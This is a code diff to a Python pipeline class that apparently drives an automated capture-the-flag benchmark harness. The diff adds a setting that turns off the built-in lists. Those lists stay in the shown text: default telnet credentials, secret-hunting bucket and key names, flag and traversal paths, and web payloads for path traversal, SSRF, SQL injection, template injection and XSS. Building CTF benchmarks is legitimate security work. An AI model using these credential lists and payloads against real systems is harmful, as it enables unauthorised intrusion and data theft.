@@ -1171,6 +1171,29 @@ class FourPillarPipeline:
             if _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", value.lower())
         }
 
+    def _benchmark_builtin_section_enabled(self, section: str) -> bool:
+        data = self._benchmark_external_profiles()
+        raw = data.get(
+            "disabled_builtin_sections",
+            data.get("disable_builtin_sections", ()),
+        )
+        disabled = {
+            value.lower()
+            for value in self._benchmark_string_tuple(raw, limit=80)
+            if _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", value.lower())
+        }
+        normalized = section.lower()
+        aliases = {
+            "object_storage_buckets": "object_storage",
+            "object_storage_keys": "object_storage",
+            "lfi_paths": "lfi_base_paths",
+            "payload_profiles": "payloads",
+            "param_payload_profiles": "payloads",
+            "telnet": "telnet_credentials",
+        }
+        canonical = aliases.get(normalized, normalized)
+        return "all" not in disabled and canonical not in disabled
+
     def _benchmark_difficulty_rank(self, difficulty: Any) -> int:
         normalized = str(difficulty or "").lower()
         order = list(self._benchmark_selection_policy()["difficulty_order"])
@@ -2099,7 +2122,12 @@ class FourPillarPipeline:
     def _benchmark_probe_paths(self) -> list[str]:
         data = self._benchmark_external_profiles()
         external = self._benchmark_string_tuple(data.get("probe_paths"), limit=160)
-        return list(dict.fromkeys(self._benchmark_builtin_probe_paths() + list(external)))
+        builtin = (
+            self._benchmark_builtin_probe_paths()
+            if self._benchmark_builtin_section_enabled("probe_paths")
+            else []
+        )
+        return list(dict.fromkeys(builtin + list(external)))
 
     @staticmethod
     def _benchmark_builtin_flag_paths() -> tuple[str, ...]:
@@ -2126,8 +2154,13 @@ class FourPillarPipeline:
     def _benchmark_flag_paths(self, *, limit: int = 40) -> tuple[str, ...]:
         data = self._benchmark_external_profiles()
         external = self._benchmark_string_tuple(data.get("flag_paths"), limit=80)
+        builtin = (
+            self._benchmark_builtin_flag_paths()
+            if self._benchmark_builtin_section_enabled("flag_paths")
+            else ()
+        )
         paths: list[str] = []
-        for raw_path in self._benchmark_builtin_flag_paths() + external:
+        for raw_path in builtin + external:
             path = str(raw_path or "").strip()
             if not path:
                 continue
@@ -3612,10 +3645,14 @@ class FourPillarPipeline:
             data.get("lfi_base_paths", data.get("lfi_paths", ())),
             limit=120,
         )
+        builtin = (
+            self._benchmark_builtin_lfi_base_paths()
+            if self._benchmark_builtin_section_enabled("lfi_base_paths")
+            else []
+        )
         return list(
             dict.fromkeys(
-                self._benchmark_builtin_lfi_base_paths()
-                + list(external_paths)
+                builtin + list(external_paths)
             )
         )
 
@@ -3705,7 +3742,12 @@ class FourPillarPipeline:
     def _benchmark_raw_protocol_commands(self) -> tuple[str, ...]:
         data = self._benchmark_external_profiles()
         external = self._benchmark_string_tuple(data.get("raw_protocol_commands"), limit=30)
-        return tuple(dict.fromkeys(("HELP", "SETBODY hello", "BUILD", "QUIT") + external))
+        builtin = (
+            ("HELP", "SETBODY hello", "BUILD", "QUIT")
+            if self._benchmark_builtin_section_enabled("raw_protocol_commands")
+            else ()
+        )
+        return tuple(dict.fromkeys(builtin + external))
 
     @staticmethod
     def _benchmark_telnet_plain_and_reply(data: bytes) -> tuple[str, bytes]:
@@ -3823,7 +3865,7 @@ class FourPillarPipeline:
     def _benchmark_telnet_credentials(self) -> tuple[tuple[str, str], ...]:
         data = self._benchmark_external_profiles()
         external = self._benchmark_string_pair_tuple(data.get("telnet_credentials"), limit=30)
-        return tuple(dict.fromkeys((
+        builtin = (
             ("root", "root"),
             ("root", "password"),
             ("root", "toor"),
@@ -3833,7 +3875,8 @@ class FourPillarPipeline:
             ("guest", "guest"),
             ("ctf", "ctf"),
             ("test", "test"),
-        ) + external))
+        ) if self._benchmark_builtin_section_enabled("telnet_credentials") else ()
+        return tuple(dict.fromkeys(builtin + external))
 
     def _benchmark_telnet_flag_command(self) -> str:
         data = self._benchmark_external_profiles()
@@ -4255,7 +4298,7 @@ class FourPillarPipeline:
     def _benchmark_object_storage_buckets(self) -> list[str]:
         data = self._benchmark_external_profiles()
         external = self._benchmark_string_tuple(data.get("object_storage_buckets"), limit=80)
-        return list(dict.fromkeys(list(external) + [
+        builtin = [
             "company-secrets",
             "secret-data",
             "secret",
@@ -4266,12 +4309,13 @@ class FourPillarPipeline:
             "flags",
             "backup",
             "backups",
-        ]))
+        ] if self._benchmark_builtin_section_enabled("object_storage") else []
+        return list(dict.fromkeys(list(external) + builtin))
 
     def _benchmark_object_storage_keys(self) -> tuple[str, ...]:
         data = self._benchmark_external_profiles()
         external = self._benchmark_string_tuple(data.get("object_storage_keys"), limit=120)
-        return tuple(dict.fromkeys(external + (
+        builtin = (
             "",
             "flag",
             "flag.txt",
@@ -4283,7 +4327,8 @@ class FourPillarPipeline:
             "backup.zip",
             "README.md",
             "README.txt",
-        )))
+        ) if self._benchmark_builtin_section_enabled("object_storage") else ()
+        return tuple(dict.fromkeys(external + builtin))
 
     @staticmethod
     def _benchmark_url_is_same_container(base: str, url: str) -> bool:
@@ -4313,27 +4358,45 @@ class FourPillarPipeline:
     def _benchmark_payloads_for_param(self, name: str) -> list[str]:
         lowered = name.lower()
         payloads: list[str] = []
-        if any(part in lowered for part in ("file", "path", "page", "template", "view", "filename")):
-            payloads.extend([
-                "../flag",
-                "../../flag",
-                "../../../../flag",
-                "/flag",
-                "php://filter/convert.base64-encode/resource=index.php",
-            ])
-        if any(part in lowered for part in ("url", "uri", "redirect", "next", "target", "return")):
-            payloads.extend([
-                "file:///flag",
-                "http://127.0.0.1/flag",
-                "http://localhost/flag",
-                "http://0.0.0.0/flag",
-            ])
-        if lowered in {"id", "uid", "user", "user_id", "account", "post", "pid"} or lowered.endswith("_id"):
-            payloads.extend(["1 OR 1=1", "1' OR '1'='1", "0", "../flag"])
-        if any(part in lowered for part in ("name", "q", "query", "search", "keyword", "message")):
-            payloads.extend(["{{7*7}}", "${7*7}", "' OR '1'='1", _url_quote("<script>alert(1)</script>")])
-        if not payloads:
-            payloads.extend(["{{7*7}}", "' OR '1'='1", "../flag"])
+        if self._benchmark_builtin_section_enabled("payloads"):
+            if any(
+                part in lowered
+                for part in ("file", "path", "page", "template", "view", "filename")
+            ):
+                payloads.extend([
+                    "../flag",
+                    "../../flag",
+                    "../../../../flag",
+                    "/flag",
+                    "php://filter/convert.base64-encode/resource=index.php",
+                ])
+            if any(
+                part in lowered
+                for part in ("url", "uri", "redirect", "next", "target", "return")
+            ):
+                payloads.extend([
+                    "file:///flag",
+                    "http://127.0.0.1/flag",
+                    "http://localhost/flag",
+                    "http://0.0.0.0/flag",
+                ])
+            if (
+                lowered in {"id", "uid", "user", "user_id", "account", "post", "pid"}
+                or lowered.endswith("_id")
+            ):
+                payloads.extend(["1 OR 1=1", "1' OR '1'='1", "0", "../flag"])
+            if any(
+                part in lowered
+                for part in ("name", "q", "query", "search", "keyword", "message")
+            ):
+                payloads.extend([
+                    "{{7*7}}",
+                    "${7*7}",
+                    "' OR '1'='1",
+                    _url_quote("<script>alert(1)</script>"),
+                ])
+            if not payloads:
+                payloads.extend(["{{7*7}}", "' OR '1'='1", "../flag"])
         payloads.extend(self._benchmark_external_payloads_for_param(lowered))
         return list(dict.fromkeys(payloads))
 
